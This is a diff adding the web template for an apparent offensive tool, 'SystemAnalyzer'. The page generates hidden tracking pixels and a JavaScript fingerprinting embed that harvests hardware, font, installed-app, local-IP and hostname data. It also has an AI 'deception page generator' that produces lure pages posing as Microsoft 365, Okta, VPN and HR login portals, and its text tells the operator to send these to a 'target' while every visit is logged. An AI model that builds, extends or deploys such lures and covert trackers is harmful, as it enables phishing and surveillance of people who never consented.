@@ -1,0 +1,305 @@
+{% extends "base.html" %}
+{% block title %}Generate Pixel – SystemAnalyzer{% endblock %}
+
+{% block content %}
+<div style="display:flex; align-items:center; gap:12px; margin-bottom:20px;">
+  <a href="{{ url_for('dashboard') }}" style="color:var(--muted); font-size:13px;">&#8592; Dashboard</a>
+  <span style="color:var(--border);">/</span>
+  <h1 style="font-size:20px; font-weight:700;">Generate Tracking Pixel</h1>
+</div>
+
+<div style="max-width:820px;">
+
+  <!-- Pixel ID + network info -->
+  <div class="card" style="border-color:rgba(88,166,255,.4);">
+    <div style="display:flex; gap:16px; align-items:flex-start; flex-wrap:wrap;">
+      <div style="flex:1; min-width:200px;">
+        <div class="card-title">Pixel ID</div>
+        <code id="pid-display" style="font-size:14px; letter-spacing:1px;">{{ pixel_id }}</code>
+        <p style="color:var(--muted); font-size:12px; margin-top:8px;">
+          <a href="{{ url_for('target_detail', pixel_id=pixel_id) }}">View intel report &rarr;</a>
+        </p>
+      </div>
+      <div style="flex:1; min-width:180px; background:rgba(63,185,80,.07); border:1px solid rgba(63,185,80,.3); border-radius:6px; padding:12px;">
+        <div style="font-size:11px; font-weight:700; color:var(--green); text-transform:uppercase; letter-spacing:.6px; margin-bottom:4px;">LAN (same network)</div>
+        <code style="font-size:13px; color:var(--green);">{{ lan_ip }}:5000</code>
+        <br>
+        <a href="http://{{ lan_ip }}:5000/demo/{{ pixel_id }}" target="_blank"
+           style="font-size:11px; color:var(--green); margin-top:6px; display:inline-block;">
+          Open LAN demo &rarr;
+        </a>
+      </div>
+      <div id="tunnel-info-box" style="flex:2; min-width:260px; border-radius:6px; padding:12px; border:1px solid var(--border); background:rgba(139,148,158,.07);">
+        <div style="font-size:11px; font-weight:700; color:var(--muted); text-transform:uppercase; letter-spacing:.6px; margin-bottom:4px;" id="tunnel-box-label">
+          Checking tunnel…
+        </div>
+        <code id="tunnel-box-url" style="font-size:12px; word-break:break-all; color:#ff9d7a; display:none;"></code>
+        <p id="tunnel-box-hint" style="color:var(--muted); font-size:11px; margin-top:6px; display:none;">
+          All embed codes below are updated to this URL automatically.
+        </p>
+        <p id="tunnel-box-dead" style="color:var(--muted); font-size:11px; margin-top:4px; display:none;">
+          Use the <strong>↺ Restart Tunnel</strong> button in the header, then wait ~8 seconds.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ★ Demo Page -->
+  <div class="card" style="border-color:rgba(248,81,73,.5); background:rgba(248,81,73,.04);">
+    <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
+      <span style="background:#f85149; color:#fff; font-size:10px; font-weight:800; padding:2px 8px; border-radius:4px; letter-spacing:.5px;">EASIEST</span>
+      <div class="card-title" style="margin:0; border:none; padding:0;">Demo Page Link — Send This</div>
+    </div>
+
+    <!-- Tunnel demo URL (updates live) -->
+    <div id="demo-public-block">
+      <div style="font-size:11px; color:var(--muted); margin-bottom:4px; font-weight:600; text-transform:uppercase; letter-spacing:.5px;">Public (internet) link</div>
+      <pre id="demo-public-url" style="cursor:pointer;" title="Click to copy">Fetching tunnel URL…</pre>
+      <div style="display:flex; gap:8px; margin-top:8px; flex-wrap:wrap;">
+        <button id="btn-copy-public" class="btn btn-primary" style="font-size:12px; padding:5px 14px;" onclick="copyPre('demo-public-url', this)">Copy</button>
+        <button id="btn-open-public" class="btn btn-outline"  style="font-size:12px; padding:5px 14px;" onclick="openPublicDemo()">Open in Browser</button>
+      </div>
+    </div>
+
+    <hr style="border:none; border-top:1px solid var(--border); margin:14px 0;">
+
+    <!-- LAN demo URL (always works on same network) -->
+    <div>
+      <div style="font-size:11px; color:var(--muted); margin-bottom:4px; font-weight:600; text-transform:uppercase; letter-spacing:.5px;">LAN (same network) link</div>
+      <pre id="demo-lan-url" style="cursor:pointer;" title="Click to copy">http://{{ lan_ip }}:5000/demo/{{ pixel_id }}</pre>
+      <div style="display:flex; gap:8px; margin-top:8px;">
+        <button class="btn btn-outline" style="font-size:12px; padding:5px 14px;" onclick="copyPre('demo-lan-url', this)">Copy</button>
+        <a href="http://{{ lan_ip }}:5000/demo/{{ pixel_id }}" target="_blank" class="btn btn-outline" style="font-size:12px; padding:5px 14px;">Open in Browser</a>
+      </div>
+    </div>
+
+    <p style="color:var(--muted); font-size:12px; margin-top:14px; line-height:1.6;">
+      A fully-rendered IT portal page with pixel + JS <strong>silently auto-embedded</strong>.
+      Target sees a real-looking page — fingerprint hits the dashboard the moment they open it.
+    </p>
+  </div>
+
+  <!-- Pixel URL -->
+  <div class="card">
+    <div class="card-title">1×1 Tracking Pixel URL (raw)</div>
+    <pre id="pixel-url" style="cursor:pointer;" title="Click to copy">{{ pixel_url }}</pre>
+    <p style="color:var(--muted); font-size:12px; margin-top:10px;">
+      Triggers on any HTTP request — email, web page, document, chat message.
+    </p>
+  </div>
+
+  <!-- Full JS embed -->
+  <div class="card">
+    <div class="card-title">HTML Embed – Full Fingerprint (recommended)</div>
+    <pre id="embed-full" style="cursor:pointer;" title="Click to copy">&lt;img src="{{ pixel_url }}" width="1" height="1" style="display:none" alt=""&gt;
+&lt;script src="{{ js_url }}"&gt;&lt;/script&gt;</pre>
+    <p style="color:var(--muted); font-size:12px; margin-top:10px;">
+      Screen, timezone, CPU, RAM, GPU, canvas hash, audio hash, fonts, plugins, installed apps, local IPs, hostname.
+    </p>
+  </div>
+
+  <!-- Pixel only -->
+  <div class="card">
+    <div class="card-title">HTML Embed – Pixel Only (no JS)</div>
+    <pre style="cursor:pointer;" title="Click to copy">&lt;img src="{{ pixel_url }}" width="1" height="1" style="display:none" alt=""&gt;</pre>
+    <p style="color:var(--muted); font-size:12px; margin-top:10px;">IP, OS/browser from User-Agent, Accept-Language, referrer. Works in email.</p>
+  </div>
+
+  <!-- Email -->
+  <div class="card">
+    <div class="card-title">HTML Email Body Snippet</div>
+    <pre style="cursor:pointer;" title="Click to copy">&lt;html&gt;&lt;body&gt;
+  &lt;!-- your email content --&gt;
+  &lt;img src="{{ pixel_url }}" width="1" height="1" border="0"&gt;
+&lt;/body&gt;&lt;/html&gt;</pre>
+  </div>
+
+  <!-- cURL test -->
+  <div class="card">
+    <div class="card-title">Quick Test (cURL)</div>
+    <pre style="cursor:pointer;" title="Click to copy">curl -s "{{ pixel_url }}" -o /dev/null -w "%{http_code}"</pre>
+    <p style="color:var(--muted); font-size:12px; margin-top:10px;">Should return <code>200</code>. Check the dashboard for the hit.</p>
+  </div>
+
+  <!-- Deception Page Generator -->
+  <div class="card" style="border-color:rgba(248,81,73,.3); margin-top:8px;">
+    <div class="card-title">🎭 Deception Page Generator (AI)</div>
+    <p style="color:var(--muted);font-size:12px;margin-bottom:12px;">
+      AI generates a themed corporate portal page with the tracking pixel silently embedded.
+      Open the lure URL — the target sees a believable page, you get the hit.
+    </p>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
+      <select id="deception-theme"
+        style="flex:1;min-width:220px;background:#010409;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:7px 10px;font-size:12px;">
+        <option value="auto (detect from target profile)">🤖 Auto-detect from target profile</option>
+        <option value="Microsoft 365 / Outlook Login">Microsoft 365 / Outlook Login</option>
+        <option value="Okta SSO Portal">Okta SSO Portal</option>
+        <option value="VPN / Remote Access Portal">VPN / Remote Access Portal</option>
+        <option value="IT Help Desk Ticket">IT Help Desk Ticket</option>
+        <option value="SharePoint / OneDrive">SharePoint / OneDrive</option>
+        <option value="HR Self-Service Portal">HR Self-Service Portal</option>
+        <option value="Corporate Wi-Fi Login">Corporate Wi-Fi Login</option>
+      </select>
+      <button onclick="generateLurePage()" id="lure-btn" class="btn btn-primary" style="padding:7px 16px;font-size:12px;">Generate Lure Page</button>
+    </div>
+    <div id="lure-output" style="display:none;">
+      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+        <code id="lure-url" style="flex:1;font-size:12px;background:rgba(255,255,255,.05);padding:6px 10px;border-radius:6px;word-break:break-all;"></code>
+        <button onclick="copyLureUrl()" class="btn btn-outline" style="padding:5px 12px;font-size:12px;">📋 Copy</button>
+        <button onclick="openLurePage()" class="btn btn-outline" style="padding:5px 12px;font-size:12px;">Preview</button>
+      </div>
+      <p style="color:var(--muted);font-size:11px;margin-top:6px;">Send this URL to the target. Page is served live — every visit is logged.</p>
+    </div>
+  </div>
+
+  <div style="display:flex; gap:12px; margin-top:8px; flex-wrap:wrap;">
+    <a href="{{ url_for('target_detail', pixel_id=pixel_id) }}" class="btn btn-primary">View Intel Report</a>
+    <a href="{{ url_for('generate_pixel') }}" class="btn btn-outline">Generate Another Pixel</a>
+  </div>
+
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+var PIXEL_ID   = '{{ pixel_id }}';
+var LAN_IP     = '{{ lan_ip }}';
+var _publicDemoUrl = null;
+
+// ── Fetch live tunnel URL and update all public URLs on page ──────────────
+function refreshTunnelUrls() {
+  fetch('/api/tunnel/status')
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      var box      = document.getElementById('tunnel-info-box');
+      var boxLabel = document.getElementById('tunnel-box-label');
+      var boxUrl   = document.getElementById('tunnel-box-url');
+      var boxHint  = document.getElementById('tunnel-box-hint');
+      var boxDead  = document.getElementById('tunnel-box-dead');
+
+      if (d.alive && d.url) {
+        var base     = d.url;
+        var demoUrl  = base + '/demo/' + PIXEL_ID;
+        var pixelUrl = base + '/pixel/' + PIXEL_ID + '.png';
+        var jsUrl    = base + '/fp.js?pid=' + PIXEL_ID;
+
+        _publicDemoUrl = demoUrl;
+
+        // Update tunnel info box
+        box.style.background  = 'rgba(248,81,73,.07)';
+        box.style.borderColor = 'rgba(248,81,73,.4)';
+        boxLabel.style.color  = 'var(--red)';
+        boxLabel.textContent  = '⬤ Public Internet (tunnel active)';
+        boxUrl.textContent    = base;
+        boxUrl.style.display  = 'inline';
+        boxHint.style.display = 'block';
+        boxDead.style.display = 'none';
+
+        // Update demo public URL
+        document.getElementById('demo-public-url').textContent = demoUrl;
+
+        // Update pixel URL card
+        document.getElementById('pixel-url').textContent = pixelUrl;
+
+        // Update full embed card
+        document.getElementById('embed-full').textContent =
+          '<img src="' + pixelUrl + '" width="1" height="1" style="display:none" alt="">\n' +
+          '<script src="' + jsUrl + '"><\/script>';
+
+      } else {
+        _publicDemoUrl = null;
+        box.style.background  = 'rgba(139,148,158,.07)';
+        box.style.borderColor = 'var(--border)';
+        boxLabel.style.color  = 'var(--red)';
+        boxLabel.textContent  = '⬤ Tunnel down';
+        boxUrl.style.display  = 'none';
+        boxHint.style.display = 'none';
+        boxDead.style.display = 'block';
+        document.getElementById('demo-public-url').textContent = '— Tunnel offline — use Restart Tunnel in header';
+      }
+    });
+}
+
+function openPublicDemo() {
+  if (_publicDemoUrl) {
+    window.open(_publicDemoUrl, '_blank');
+  } else {
+    alert('Tunnel is offline. Click ↺ Restart Tunnel in the header first.');
+  }
+}
+
+// ── Deception Page Generator ──────────────────────────────────────────────
+var _lureUrl = null;
+
+function generateLurePage() {
+  var btn   = document.getElementById('lure-btn');
+  var out   = document.getElementById('lure-output');
+  var theme = document.getElementById('deception-theme').value;
+  btn.disabled = true; btn.textContent = '⏳ Generating…';
+  out.style.display = 'none';
+
+  fetch('/api/deception/generate/' + PIXEL_ID, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({theme: theme})
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(d) {
+    btn.disabled = false; btn.textContent = 'Regenerate';
+    if (d.error) { alert('Error: ' + d.error); return; }
+    // Build the lure URL using current tunnel or LAN
+    var base = (_publicDemoUrl || ('http://' + LAN_IP + ':5000'))
+                 .replace(/\/demo\/.*$/, '').replace(/\/$/, '');
+    var enc  = encodeURIComponent(theme);
+    _lureUrl = base + '/lure/' + PIXEL_ID + '?theme=' + enc;
+    document.getElementById('lure-url').textContent = _lureUrl;
+    out.style.display = 'block';
+  })
+  .catch(function(e) {
+    btn.disabled = false; btn.textContent = 'Generate Lure Page';
+    alert('Error: ' + e);
+  });
+}
+
+function copyLureUrl() {
+  if (_lureUrl) navigator.clipboard.writeText(_lureUrl)
+    .then(function(){ alert('Lure URL copied!'); });
+}
+
+function openLurePage() {
+  if (_lureUrl) window.open(_lureUrl, '_blank');
+}
+
+function copyPre(id, btn) {
+  var text = document.getElementById(id).textContent.trim();
+  if (!text || text.startsWith('—') || text.startsWith('Fetching')) {
+    alert('Tunnel is offline. Click ↺ Restart Tunnel in the header first.');
+    return;
+  }
+  navigator.clipboard.writeText(text).then(function() {
+    var orig = btn.textContent;
+    btn.textContent = 'Copied!';
+    btn.style.background = 'var(--green)';
+    btn.style.color = '#000';
+    setTimeout(function(){ btn.textContent = orig; btn.style.background = ''; btn.style.color = ''; }, 1400);
+  });
+}
+
+// Click-to-copy on all <pre> blocks
+document.querySelectorAll('pre').forEach(function(pre) {
+  pre.addEventListener('click', function() {
+    var text = pre.textContent.trim();
+    if (!text || text.startsWith('—') || text.startsWith('Fetching')) return;
+    navigator.clipboard.writeText(text).then(function() {
+      var orig = pre.style.outline;
+      pre.style.outline = '1px solid var(--accent)';
+      setTimeout(function(){ pre.style.outline = orig; }, 700);
+    });
+  });
+});
+
+// Load on page open, then refresh every 10 seconds
+refreshTunnelUrls();
+setInterval(refreshTunnelUrls, 10000);
+</script>
+{% endblock %}
